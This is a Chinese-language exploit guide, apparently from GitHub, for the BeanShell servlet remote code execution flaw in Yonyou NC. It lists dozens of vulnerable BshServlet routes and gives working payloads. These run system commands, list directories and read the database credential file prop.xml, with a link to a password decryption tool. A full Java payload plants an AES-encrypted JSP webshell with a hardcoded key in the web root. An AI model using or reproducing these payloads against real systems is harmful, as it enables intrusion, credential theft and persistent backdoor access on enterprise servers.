# 0x00 前置知识
## 0.1 什么是Beanshell
- Beanshell是一种完全符合Java语法规范的脚本语言，并且含有自己的一些语法和方法。
- BeanShell是一种松散类型的脚本语言（这点和JS类似）。
- BeanShell是用java写成的一个小型的、免费的、可以下载的、嵌入式的Java源代码解释器，具有对象脚本语言特性，非常精简的解释器jar文件大小未175k。
- BeanShell执行标准Java语句和表达式，另外包括一些脚本命令和语法。

## 0.2 基本函数
- [`beanshell` 官方文档](http://www.beanshell.org/manual/bshcommands.html#load)

| **函数** | **作用**                 |
| -------- | ------------------------ |
| cat()    | 读取文件                 |
| dir()    | 查看目录                 |
| exec()   | 运行系统命令             |
| load()   | 加载或序列化对象到文件中 |
| save()   | 保存序列化对象到文件中   |

# 0x01 漏洞路由
可用的 `BshServlet` 地址：
（service 可替换为 servlet）

```bash
https://url/service/~aim/bsh.servlet.BshServlet
https://url/service/~alm/bsh.servlet.BshServlet
https://url/service/~ampub/bsh.servlet.BshServlet
https://url/service/~arap/bsh.servlet.BshServlet
https://url/service/~aum/bsh.servlet.BshServlet
https://url/service/~cc/bsh.servlet.BshServlet
https://url/service/~cdm/bsh.servlet.BshServlet
https://url/service/~cmp/bsh.servlet.BshServlet
https://url/service/~ct/bsh.servlet.BshServlet
https://url/service/~dm/bsh.servlet.BshServlet
https://url/service/~erm/bsh.servlet.BshServlet
https://url/service/~fa/bsh.servlet.BshServlet
https://url/service/~fac/bsh.servlet.BshServlet
https://url/service/~fbm/bsh.servlet.BshServlet
https://url/service/~ff/bsh.servlet.BshServlet
https://url/service/~fip/bsh.servlet.BshServlet
https://url/service/~fipub/bsh.servlet.BshServlet
https://url/service/~fp/bsh.servlet.BshServlet
https://url/service/~fts/bsh.servlet.BshServlet
https://url/service/~fvm/bsh.servlet.BshServlet
https://url/service/~gl/bsh.servlet.BshServlet
https://url/service/~hrhi/bsh.servlet.BshServlet
https://url/service/~hrjf/bsh.servlet.BshServlet
https://url/service/~hrpd/bsh.servlet.BshServlet
https://url/service/~hrpub/bsh.servlet.BshServlet
https://url/service/~hrtrn/bsh.servlet.BshServlet
https://url/service/~hrwa/bsh.servlet.BshServlet
https://url/service/~ia/bsh.servlet.BshServlet
https://url/service/~ic/bsh.servlet.BshServlet
https://url/service/~iufo/bsh.servlet.BshServlet
https://url/service/~modules/bsh.servlet.BshServlet
https://url/service/~mpp/bsh.servlet.BshServlet
https://url/service/~obm/bsh.servlet.BshServlet
https://url/service/~pu/bsh.servlet.BshServlet
https://url/service/~qc/bsh.servlet.BshServlet
https://url/service/~sc/bsh.servlet.BshServlet
https://url/service/~scmpub/bsh.servlet.BshServlet
https://url/service/~so/bsh.servlet.BshServlet
https://url/service/~so2/bsh.servlet.BshServlet
https://url/service/~so3/bsh.servlet.BshServlet
https://url/service/~so4/bsh.servlet.BshServlet
https://url/service/~so5/bsh.servlet.BshServlet
https://url/service/~so6/bsh.servlet.BshServlet
https://url/service/~tam/bsh.servlet.BshServlet
https://url/service/~tbb/bsh.servlet.BshServlet
https://url/service/~to/bsh.servlet.BshServlet
https://url/service/~uap/bsh.servlet.BshServlet
https://url/service/~uapbd/bsh.servlet.BshServlet
https://url/service/~uapde/bsh.servlet.BshServlet
https://url/service/~uapeai/bsh.servlet.BshServlet
https://url/service/~uapother/bsh.servlet.BshServlet
https://url/service/~uapqe/bsh.servlet.BshServlet
https://url/service/~uapweb/bsh.servlet.BshServlet
https://url/service/~uapws/bsh.servlet.BshServlet
https://url/service/~vrm/bsh.servlet.BshServlet
https://url/service/~yer/bsh.servlet.BshServlet
```

# 0x02 漏洞利用
## 2.1 系统命令执行
```bash
# 路由
/servlet/~ic/bsh.servlet.BshServlet

# 命令执行
exec("whoami");
```

<div align=center><img width="592" height="550" alt="image" src="https://user-images.githubusercontent.com/84888757/223076572-a54b9277-1f42-4ab5-b038-5748e6f75fa0.png" /></div>

## 2.2 查看文件路径
```bash
# 获取任意路径
dir("./");
dir("./webapps/nc_web/");

# 获取绝对路径
new File("").getAbsoluteFile();
```

<div align=center><img width="388" src="https://user-images.githubusercontent.com/84888757/223072163-76ab4020-bd8a-4377-b639-047d8185ec5f.png" /></div>


## 2.3 读取数据库密码
nc的数据库密码位置在 `/ierp/bin/prop.xml`
```bash
cat("/ierp/bin/prop.xml");
```
<div align=center><img width="747" alt="image" src="https://user-images.githubusercontent.com/84888757/223073185-41f27e33-7ff9-4c1b-93ef-e29a9620edb6.png" /></div>


- 用友nc解密工具：https://github.com/1amfine2333/ncDecode

<div align=center><img width="747" alt="image" src="https://user-images.githubusercontent.com/84888757/223073279-8459749a-f5cb-494d-b9c7-42f23a803e9a.png" /></div>



## 2.4 写文件
`beanshell` 完全符合Java语法规范，所以可以通过写一个java脚本来写入文件。

先用 `dir` 命令来探明 web文件夹的位置，然后构造java脚本（或者直接获取绝对路径、相对路径）。

### windows写入webshell
```java
import java.io.*;String filePath = "./webapps/nc_web/1.jsp"; String conent ="<%@page import=\"java.util.*,javax.crypto.*,javax.crypto.spec.*\"%><%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%><%if (request.getMethod().equals(\"POST\")){String k=\"e45e329feb5d925b\";session.putValue(\"u\",k);Cipher c=Cipher.getInstance(\"AES\");c.init(2,new SecretKeySpec(k.getBytes(),\"AES\"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);}%>";BufferedWriter out = null;try {File file = new File(filePath);File fileParent = file.getParentFile();if (!fileParent.exists()) {fileParent.mkdirs();}file.createNewFile();out = new BufferedWriter(new OutputStreamWriter(new FileOutputStream(file, true)));out.write(conent);}catch(Exception e) {e.printStackTrace();} finally {try {out.close();} catch (IOException e) {e.printStackTrace();}}
```

<div align=center><img width="647" alt="image" src="https://user-images.githubusercontent.com/84888757/223074382-9cc38b65-8dae-481d-9e01-84125b2dc4da.png" /></div>


<div align=center><img width="683" alt="image" src="https://user-images.githubusercontent.com/84888757/223074706-1c42bc3f-e261-495a-916d-6f917ffb0e6a.png" /></div>





